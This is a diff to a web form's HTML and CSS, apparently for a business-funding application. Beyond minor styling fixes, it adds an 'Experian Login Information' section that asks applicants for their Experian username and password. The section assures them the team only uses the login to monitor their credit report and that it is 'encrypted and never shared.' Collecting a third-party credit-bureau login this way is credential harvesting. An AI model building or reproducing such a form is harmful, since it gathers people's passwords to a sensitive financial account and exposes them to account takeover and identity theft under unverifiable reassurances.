@@ -348,6 +348,22 @@
     .sig-input-field::placeholder { color: var(--gray-300); }
 
     /* ── FORM SCREENS ─────────────────────────────────── */
+    .experian-info-box {
+      display: flex;
+      align-items: flex-start;
+      gap: 10px;
+      background: #eff8ff;
+      border: 1px solid rgba(34,167,240,0.25);
+      border-radius: 10px;
+      padding: 12px 14px;
+      margin-bottom: 16px;
+      font-size: 13px;
+      color: var(--gray-600);
+      line-height: 1.55;
+    }
+    .experian-info-box svg { flex-shrink: 0; margin-top: 1px; stroke: var(--blue); }
+    .experian-info-box strong { color: var(--navy); }
+
     .form-section-title {
       font-family: var(--font-head);
       font-size: 14px;
@@ -385,6 +401,9 @@
     .form-group input,
     .form-group select,
     .form-group textarea {
+      width: 100%;
+      min-width: 0;
+      box-sizing: border-box;
       height: 44px;
       border: 1.5px solid var(--gray-200);
       border-radius: 10px;
@@ -1514,7 +1533,21 @@
           </div>
         </div>
 
-        <div class="form-section-title">Security & Account Access</div>
+        <div class="form-section-title">Experian Login Information</div>
+        <div class="experian-info-box">
+          <svg width="16" height="16" fill="none" viewBox="0 0 24 24" stroke="currentColor" stroke-width="2"><path d="M13 16h-1v-4h-1m1-4h.01M21 12a9 9 0 11-18 0 9 9 0 0118 0z"/></svg>
+          <span>Please provide your <strong>Experian account credentials</strong>. Our team uses this to access and monitor your credit report throughout the funding process. Your information is encrypted and never shared.</span>
+        </div>
+        <div class="form-grid full">
+          <div class="form-group">
+            <label>Experian Email / Username *</label>
+            <input id="b_expEmail" type="email" placeholder="Email used to log in to Experian" />
+          </div>
+          <div class="form-group">
+            <label>Experian Password *</label>
+            <input id="b_expPass" type="password" placeholder="Your Experian account password" />
+          </div>
+        </div>
         <div class="form-grid">
           <div class="form-group">
             <label>Security Question *</label>
